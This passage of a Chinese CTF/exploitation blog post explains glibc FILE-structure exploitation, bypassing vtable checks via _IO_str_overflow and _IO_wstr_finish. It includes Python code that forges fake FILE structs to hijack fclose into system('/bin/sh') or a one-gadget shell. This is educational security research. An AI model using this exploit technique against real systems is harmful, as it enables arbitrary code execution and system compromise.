+<p>利用思路就很简单了，设置 <code>fp+0xe0</code> 为 <code>system</code>, 同时设置 <code>fp-&gt;_IO_buf_end</code> 和 <code>fp-&gt;_IO_buf_base</code>, 使得 <code>2 * size + 100</code> 为 <code>/bin/sh</code> 的地址， 执行 <code>system(&quot;/bin/sh&quot;)</code> 获取 <code>shell</code>。</p>
+<p>比如<code>fp-&gt;_IO_buf_base=0</code> 和 <code>fp-&gt;_IO_buf_end=(sh-100)/2</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fake_file += p64(0x0)   	 # buf_base</div><div class="line">fake_file += p64((sh-100)/2) # buf_end</div></pre></td></tr></table></figure>
+<p>当执行 <code>fclose</code> 是会 调用 <code>_IO_FINISH (fp)</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515855936790mnhxjuk7.png?imageslim" alt="paste image"></p>
+<p>其实就是 <code>fp-&gt;vtable-&gt;__finish</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)</div></pre></td></tr></table></figure></p>
+<p>执行 <code>_IO_FINISH (fp)</code> 之前还对 锁进行了获取， 所以我们需要设置 <code>fp-&gt;_lock</code> 的值为一个 指向 <code>0x0</code> 的值（<code>*ptr=0x0000000000000000</code>），所以最终的 <code>file</code> 结构体的内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">fake_file = p64(0x0)  # flag</div><div class="line">fake_file += p64(0x0)    # read_ptr</div><div class="line">fake_file += p64(0x0)    # read_end</div><div class="line">fake_file += p64(0x0)    # read_base</div><div class="line"></div><div class="line"></div><div class="line">fake_file += p64(0x0)        # write_base</div><div class="line">fake_file += p64(sh) 		 # write_ptr - write_base  &gt; buf_end - buf_base, bypass check</div><div class="line">fake_file += p64(0x0)        # write_end</div><div class="line"></div><div class="line">fake_file += p64(0x0)   	 # buf_base</div><div class="line">fake_file += p64((sh-100)/2) # buf_end</div><div class="line"></div><div class="line">fake_file += &quot;\x00&quot; * (0x88 - len(fake_file))  # padding for _lock</div><div class="line">fake_file += p64(0x00601273)   # ptr--&gt;0x0 , for bypass get lock</div><div class="line"></div><div class="line"># p _IO_str_jumps</div><div class="line">fake_file += &quot;\x00&quot; * (0xd8 - len(fake_file))  # padding for vtable</div><div class="line">fake_file += p64(_IO_jump_t + 0x8) # make __IO_str_overflow on __finish , which call by fclose</div><div class="line"></div><div class="line">fake_file += &quot;\x00&quot; * (0xe0 - len(fake_file))  # padding for vtable</div><div class="line">fake_file += p64(system) # ((_IO_strfile *) fp)-&gt;_s._allocate_buffer</div></pre></td></tr></table></figure>
+<p>有一个小细节我把 <code>vtable</code> 设置为了 <code>p64(_IO_jump_t + 0x8)</code>,原因在于 一个正常的 <code>FILE</code> 结构体的 <code>vtable</code> 的结构为</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515856301831h58wszly.png?imageslim" alt="paste image"></p>
+<p><code>_finish</code> 在第三个字段</p>
+<p><code>__IO_str_overflow</code>是 <code>_IO_str_jumps</code> 的第4个字段.</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515854803562nlpu56fi.png?imageslim" alt="paste image"></p>
+<p><code>vtable</code> 设置为 <code>p64(_IO_jump_t + 0x8)</code> 后， <code>vtable-&gt;_finish</code> 为 <code>__IO_str_overflow</code> 的地址了。</p>
+<p>在调用 <code>fclose</code> 处下个断点，断下来后打印第一个参数<br><img src="http://oy9h5q2k4.bkt.clouddn.com/151585657581289u226j6.png?imageslim" alt="paste image"><br>可以看到 </p>
+<ul>
+<li><code>_flags</code> 域 为 0</li>
+<li><code>2*(buf_end - buf_base) + 100</code> 指向 <code>/bin/sh</code></li>
+<li><code>_lock</code> 指向 <code>0x0</code></li>
+<li>虚表的第三个表项（<code>vtable-&gt;_finish</code>）为 <code>__IO_str_overflow</code> 的地址</li>
+<li><code>$rdi+0xe0</code> 为 <code>system</code> 的地址(rdi即为 fp)</li>
+</ul>
+<p>这样在执行 <code>fclose</code> 时就会进入 <code>__IO_str_overflow</code> ，然后进入 <code>call    qword ptr [fp+0E0h]</code> 执行  <code>system(&quot;/bin/sh&quot;)</code> 拿到 <code>shell</code> </p>
+<p><strong>利用 _IO_wstr_finish</strong></p>
+<p><code>_IO_wstr_finish</code> 位于 <code>_IO_wstr_jumps</code> 里面</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515857161075rcccf4qo.png?imageslim" alt="paste image"></p>
+<p>可以看到 <code>_IO_wstr_jumps</code>  也是位于 位于  <code>__stop___libc_IO_vtables</code>  和 <code>__start___libc_IO_vtables</code>  之间的。</p>
+<p><code>_IO_wstr_finish</code>  的 <code>check</code> 比较简单</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515857235249m55yixue.png?imageslim" alt="paste image"></p>
+<p>当 <code>fp-&gt;_wide_data-&gt;_IO_buf_base</code> 不为0， 而且 <code>v2-&gt;_flags2</code> 就可以劫持 <code>rip</code> 了，看汇编代码会清晰不少</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515857376013zpcvyoh1.png?imageslim" alt="paste image"></p>
+<p>只需要在 <code>fp+0xa0</code> 处放置一个指针 <code>ptr</code> , 使得 <code>ptr+0x30</code> 处的 值不为 0 即可。（这个值随便找就行），然后 设置   <code>fp+0x74</code> 的值为 <code>0</code>， 最后设置 <code>fp+0xe8</code> 的值为 <code>one_shot</code> ，在执行 <code>fclose()</code>时就会去执行 <code>one_shot</code> 拿到 <code>shell</code></p>
+<p>伪造 <code>file</code> 结构体的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">fake_file = p64(0x0)  # flag</div><div class="line">fake_file += p64(0x0)    # read_ptr</div><div class="line">fake_file += p64(0x0)    # read_end</div><div class="line">fake_file += p64(0x0)    # read_base</div><div class="line"></div><div class="line"></div><div class="line">fake_file += p64(0x0)        # write_base</div><div class="line">fake_file += p64(sh) 		 # write_ptr - write_base  &gt; buf_end - buf_base, bypass check</div><div class="line">fake_file += p64(0x0)        # write_end</div><div class="line"></div><div class="line">fake_file += p64(0x0)   	 # buf_base</div><div class="line">fake_file += p64((sh-100)/2) # buf_end</div><div class="line"></div><div class="line"></div><div class="line">fake_file += &quot;\x00&quot; * (0x88 - len(fake_file))  # padding for _lock</div><div class="line"></div><div class="line">fake_file += p64(0x00601273)   # ptr--&gt;0x0 , for bypass get lock</div><div class="line"></div><div class="line">fake_file +=  &quot;\x00&quot; * (0xa0 - len(fake_file)) </div><div class="line">fake_file += p64(0x601030) # _wide_data</div><div class="line"></div><div class="line"># p &amp;_IO_wstr_jumps</div><div class="line">fake_file += &quot;\x00&quot; * (0xd8 - len(fake_file))  # padding for vtable</div><div class="line">fake_file += p64(_IO_wstr_jumps) </div><div class="line"></div><div class="line">fake_file += &quot;\x00&quot; * (0xe8 - len(fake_file))  # padding for vtable</div><div class="line">fake_file += p64(one_shot) # rip</div></pre></td></tr></table></figure></p>
+<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>ida看代码比较清楚，文中的两种方法挺不错，利用了其他的 <code>vtable</code> 中的有趣的函数来绕过 <code>check</code></p>
+<p><strong>参考</strong></p>
+<p><a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/" target="_blank" rel="external">https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/</a></p>
+<p><a href="http://blog.rh0gue.com/2017-12-31-34c3ctf-300/" target="_blank" rel="external">http://blog.rh0gue.com/2017-12-31-34c3ctf-300/</a></p>
+
+        
+                <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
+                    <p><strong>
+                         
+                            <a>本站文章均原创， 转载注明来源</a>
+                        </strong>
+                        <br>
+                        <strong>本文链接：</strong><a href="http://blog.hac425.top/2018/01/13/pwn_with_file_part4.html">http://blog.hac425.top/2018/01/13/pwn_with_file_part4.html</a>
+                    </p>
+                </blockquote>
+        
+    
+
+    
+</div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+    <!-- 使用 来必力 -->
+<div id="livere-comment">
+    <!-- 来必力City版安装代码 -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC8zMTQ2OC84MDMy">
+<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+</script>
+<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+<!-- City版安装代码已完成 -->
+</div>
+<style>
+    #livere-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+        <a href="/2018/01/17/learn_unicorn.html" id="post_nav-newer" class="prev-content">
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_back</i>
+            </button>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            新篇
+        </a>
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2018/01/06/pwn_router_os_step_exp.html" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
+
+
+                    
+                        <!-- Overlay For Active Sidebar -->
+<div class="sidebar-overlay"></div>
+
+<!-- Material sidebar -->
+<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
+    <div id="sidebar-main">
+        <!-- Sidebar Header -->
+        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
+    <!-- Top bar -->
+    <div class="top-bar"></div>
+
+    <!-- Sidebar toggle button -->
+    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
+        <i class="material-icons">clear_all</i>
+        <span class="mdl-button__ripple-container">
+            <span class="mdl-ripple">
+            </span>
+        </span>
+    </button>
+
+    <!-- Sidebar Avatar -->
+    <div class="sidebar-image">
+        <img src="/img/girl.png" alt="hac425's avatar">
+    </div>
+
+    <!-- Sidebar Email -->
+    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
+        hac425xxx@gmail.com
+        <b class="caret"></b>
+    </a>
+</div>
+
+
+        <!-- Sidebar Navigation  -->
+        <ul class="nav sidebar-nav">
+    <!-- User dropdown  -->
+    <li class="dropdown">
+        <ul id="settings-dropdown" class="dropdown-menu">
+            
+                <li>
+                    <a href="#" target="_blank" title="Email Me">
+                        
+                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
+                        
+                        Email Me
+                    </a>
+                </li>
+            
+        </ul>
+    </li>
+
+    <!-- Homepage -->
+    
+        <li id="sidebar-first-li">
+            <a href="/">
+                
+                    <i class="material-icons sidebar-material-icons">home</i>
+                
+                主页
+            </a>
+        </li>
+        
+    
+
+    <!-- Archives  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">inbox</i>
+                
+                    归档
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+            <li>
+                <a class="sidebar_archives-link" href="/archives/2018/01/">一月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">13</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/11/">十一月 2017<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/10/">十月 2017<span class="sidebar_archives-count">11</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/08/">八月 2017<span class="sidebar_archives-count">1</span></a>
+            </ul>
+        </li>
+        
+    
+
+    <!-- Categories  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">chrome_reader_mode</i>
+                
+                分类
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+                <li>
+                <a class="sidebar_archives-link" href="/categories/Vulnerability-analysis/">Vulnerability analysis<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/android/">android<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/chrome/">chrome<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/ctf/">ctf<span class="sidebar_archives-count">11</span></a></li><li><a class="sidebar_archives-link" href="/categories/java应用破解思路/">java应用破解思路<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/jeb破解/">jeb破解<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/categories/kernel/">kernel<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/pwn-router-os/">pwn_router_os<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/categories/reverse/">reverse<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/安卓安全/">安卓安全<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/categories/文件patch/">文件patch<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/渗透测试/">渗透测试<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/路由器安全/">路由器安全<span class="sidebar_archives-count">10</span></a>
+            </ul>
+        </li>
+        
+            <li class="divider"></li>
+        
+    
+
+    <!-- Pages  -->
+    
+        <li>
+            <a href="/about" title="关于我">
+                
+                    <i class="material-icons sidebar-material-icons">person</i>
+                
+                关于我
+            </a>
+        </li>
+        
+    
+        <li>
+            <a href="/timeline" title="时间轴">
+                
+                    <i class="material-icons sidebar-material-icons">timeline</i>
+                
+                时间轴
+            </a>
+        </li>
+        
+    
+        <li>
+            <a href="/links" title="友情链接">
+                
+                    <i class="material-icons sidebar-material-icons">people</i>
+                
+                友情链接
+            </a>
+        </li>
+        
+    
+        <li>
+            <a href="/tags" title="标签云">
+                
+                    <i class="material-icons sidebar-material-icons">invert_colors</i>
+                
+                标签云
+            </a>
+        </li>
+        
+    
+
+    <!-- Article Number  -->
+    
+        <li>
+            <a href="/archives">
+                文章总数
+                <span class="sidebar-badge">38</span>
+            </a>
+        </li>
+        
+    
+</ul>
+
+
+        <!-- Sidebar Footer -->
+        <!--
+I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
+If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
+It will not impact the appearance and can give developers a lot of support :)
+
+很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
+如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
+它不会影响美观并可以给开发者很大的支持和动力。 :)
+-->
+
+<!-- Sidebar Divider -->
+
+
+<!-- Theme Material -->
+
+
+<!-- Help & Support -->
+<!--
+
+-->
+
+<!-- Feedback -->
+<!--
+
+-->
+
+<!-- About Theme -->
+<!--
+
+-->
+
+    </div>
+
+    <!-- Sidebar Image -->
+    
+
+</aside>
+
+                    
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
+
+                    
+
+                    <script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+<!--Footer-->
+<footer class="mdl-mini-footer" id="bottom">
+    
+        <!-- Paradox Footer Left Section -->
+        <div class="mdl-mini-footer--left-section sns-list">
+    <!-- Twitter -->
+    
+        <a href="https://twitter.com/hac425" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-twitter">
+                <span class="visuallyhidden">Twitter</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Facebook -->
+    
+
+    <!-- Google + -->
+    
+
+    <!-- Weibo -->
+    
+        <a href="http://weibo.com/u/5691483590" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-weibo">
+                <span class="visuallyhidden">Weibo</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Instagram -->
+    
+
+    <!-- Tumblr -->
+    
+
+    <!-- Github -->
+    
+        <a href="https://github.com/jinyu00" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-github">
+                <span class="visuallyhidden">Github</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- LinkedIn -->
+    
+
+    <!-- Zhihu -->
+    
+
+    <!-- Bilibili -->
+    
+
+    <!-- Telegram -->
+    
+    
+    <!-- V2EX -->
+    
+</div>
+
+
+        <!--Copyright-->
+        <div id="copyright">
+            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>穷则变，变则通，通则久
+            
+        </div>
+
+        <!-- Paradox Footer Right Section -->
+
+    
+</footer>
+
+
+                    <!-- Import JS File -->
+
+    <script>lsloader.load("lazyload_js","/js/lazyload.min.js?wgjW/HuQG9JDgvPDPoRAng==", true)</script>
+
+
+
+    <script>lsloader.load("js_js","/js/js.min.js?V/53wGualMuiPM3xoetD5Q==", true)</script>
+
+
+
+    <script>lsloader.load("np_js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==", true)</script>
+
+
+<script type="text/ls-javascript" id="NProgress-script">
+    NProgress.configure({
+        showSpinner: true
+    });
+    NProgress.start();
+    $('#nprogress .bar').css({
+        'background': '#29d'
+    });
+    $('#nprogress .peg').css({
+        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
+    });
+    $('#nprogress .spinner-icon').css({
+        'border-top-color': '#29d',
+        'border-left-color': '#29d'
+    });
+    setTimeout(function() {
+        NProgress.done();
+        $('.fade').removeClass('out');
+    }, 800);
+</script>
+
+
+
+
+
+
+
+    <!-- Busuanzi -->
+    <script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+   
+
+
+
+
+
+<!-- UC Browser Compatible -->
+<script>
+	var agent = navigator.userAgent.toLowerCase();
+	if(agent.indexOf('ucbrowser')>0) {
+		document.write('<link rel="stylesheet" href="/css/uc.css">');
+	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
+	}
+</script>
+
+<!-- Import prettify js  -->
+
+
+
+<!-- Window Load -->
+<!-- add class for prettify -->
+<script type="text/ls-javascript" id="window-load">
+    $(window).on('load', function() {
+        // Post_Toc parent position fixed
+        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
+    });
+
+    
+    
+</script>
+
+<!-- MathJax Load-->
+
+
+<!-- Bing Background -->
+
+
+<script type="text/ls-javascript" id="lazy-load">
+    // Offer LazyLoad
+    queue.offer(function(){
+        $('.lazy').lazyload({
+            effect : 'show'
+        });
+    });
+
+    // Start Queue
+    $(document).ready(function(){
+        setInterval(function(){
+            queue.execNext();
+        },200);
+    });
+</script>
+
+<!-- Custom Footer -->
+
+
+
+<script>
+    (function(){
+        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
+
+        for (var i = 0; i < scriptList.length; ++i) {
+            var item = scriptList[i];
+            lsloader.runInlineScript(item.id,item.id);
+        }
+    })()
+console.log('\n %c © Material Theme | Version: 1.5.0 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
+</script>
+
+                </main>
+            </div>
+        </body>
+    
+</html>
